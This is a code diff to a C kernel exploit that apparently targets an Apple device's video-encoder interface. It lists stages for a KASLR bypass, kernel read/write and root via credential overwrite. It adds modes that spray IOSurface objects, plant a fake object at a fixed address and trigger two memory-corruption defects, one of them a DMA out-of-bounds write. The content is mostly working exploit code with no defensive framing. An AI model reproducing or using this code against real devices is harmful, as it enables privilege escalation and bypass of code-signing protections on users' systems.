@@ -383,6 +383,8 @@ int main(int argc, char *argv[]) {
         p("  detect     - Backing memory corruption test (NTL=9, safe)\n");
         p("  detect16   - Same with NTL=16 (larger overflow)\n");
         p("  detect32   - Same with NTL=32 (even larger)\n");
+        p("  combo276   - Combined Defect 1+2 test (NTL=276, enables gate)\n");
+        p("  gate_safe  - Gate activation scan (NTL 264-280, find threshold)\n");
         p("  kaslr      - Step 1: KASLR bypass via backing memory leak\n");
         p("  krw        - Step 2: Kernel R/W via pipe corruption\n");
         p("  root       - Step 3: Root via ucred overwrite\n");
@@ -468,6 +470,87 @@ int main(int argc, char *argv[]) {
         p("After achieving kernel R/W, we can SET CS_DEBUGGED (0x10000000)\n");
         p("on our proc_t.p_csflags to allow unsigned code execution.\n");
         p("Critical question: does TXM independently validate?\n");
+    } else if (strcmp(mode, "combo276") == 0) {
+        p("\n=== Combined Defect 1+2 Test (NTL=276) ===\n");
+        p("NTL=276 triggers BOTH defects simultaneously:\n");
+        p("  Defect 2 (fill loop): writes to session_ctx+0x4678..+0x4AC4\n");
+        p("    Gate pointer at +0x4AC0 becomes non-NULL (enables code block)\n");
+        p("  Defect 1 (DMA OOB): 268 extra temporal layers mapped past buffer\n");
+        p("    DMA overflow writes into physically adjacent kernel memory\n\n");
+        p("WARNING: NTL=276 is aggressive. May panic. Proceed with caution.\n\n");
+
+        p("Phase 1: IOSurface spray (%d surfaces, %d-byte backing)\n", SPRAY_COUNT, 16384);
+        for (int i = 0; i < SPRAY_COUNT; i++)
+            g_surfaces[i] = create_tagged_surface(i);
+        int created = 0;
+        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
+        p("  Created: %d surfaces\n", created);
+
+        p("Phase 2: Create holes (every %dth)\n", HOLE_STRIDE);
+        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
+            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+
+        p("Phase 3: mmap at 0x500000000 (Defect 2 fake object target)\n");
+        void *fake = mmap((void *)0x500000000ULL, 0x10000, PROT_READ | PROT_WRITE,
+                          MAP_FIXED | MAP_PRIVATE | MAP_ANON, -1, 0);
+        if (fake == MAP_FAILED) {
+            p("  mmap FAILED: %s\n", strerror(errno));
+            p("  Continuing without fake object (gate will crash on deref)\n");
+        } else {
+            p("  mmap OK at %p (64KB)\n", fake);
+            memset(fake, 0x41, 0x10000);
+            uint64_t *fp = (uint64_t *)fake;
+            fp[0] = 0x4141414141414141ULL;
+            fp[0x2D0/8] = (uint64_t)fake + 0x1000;
+            fp[0x98/8] = (uint64_t)fake + 0x2000;
+            p("  Planted fake object: +0x2D0 → %p, +0x98 → %p\n",
+              (void *)fp[0x2D0/8], (void *)fp[0x98/8]);
+        }
+
+        p("Phase 4: Encode with NTL=276 (triggers both defects)\n");
+        p("  If this causes a panic, check /var/mobile/Library/Logs/CrashReporter\n");
+        do_encode(276, 2, 0x42);
+        usleep(500000);
+
+        p("Phase 5: Check backing memory corruption\n");
+        int hits = 0;
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            if (!g_surfaces[i]) continue;
+            if (check_backing_memory(g_surfaces[i], i) > 0) hits++;
+        }
+        p("  Surfaces with corrupted backing: %d\n", hits);
+        if (hits > 0)
+            p("  *** DMA OOB AT NTL=276 CONFIRMED ***\n");
+
+        if (fake != MAP_FAILED) munmap(fake, 0x10000);
+        for (int i = 0; i < SPRAY_COUNT; i++)
+            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+
+    } else if (strcmp(mode, "gate_safe") == 0) {
+        p("\n=== Gate Pointer Activation Test (safe NTL scan) ===\n");
+        p("Tests NTL values near the gate thresholds:\n");
+        p("  +0x4AC0 gate: needs NTL >= 276 (index 274+275 = both halves)\n");
+        p("  +0x51C8 gate: needs NTL >= 726 (index 660+661 = both halves)\n\n");
+
+        int test_ntls[] = {264, 268, 272, 274, 275, 276, 278, 280};
+        int n_tests = sizeof(test_ntls) / sizeof(test_ntls[0]);
+        for (int t = 0; t < n_tests; t++) {
+            if (g_signal) break;
+            int ntl = test_ntls[t];
+            p("--- NTL=%d (gate +0x4AC0 %s) ---\n", ntl,
+              ntl >= 276 ? "ACTIVE" : "inactive");
+            int r = do_encode(ntl, 1, 0x42);
+            if (r < 0) {
+                p("  Encode FAILED (session creation error)\n");
+            } else if (g_signal) {
+                p("  *** SIGNAL %d received — crash at NTL=%d ***\n", g_signal, ntl);
+                break;
+            } else {
+                p("  Survived NTL=%d (callbacks=%d)\n", ntl, r);
+            }
+            usleep(500000);
+        }
+
     } else if (strcmp(mode, "status") == 0) {
         p("UID: %d, GID: %d, PID: %d\n", getuid(), getgid(), getpid());
         p("EUID: %d, EGID: %d\n", geteuid(), getegid());
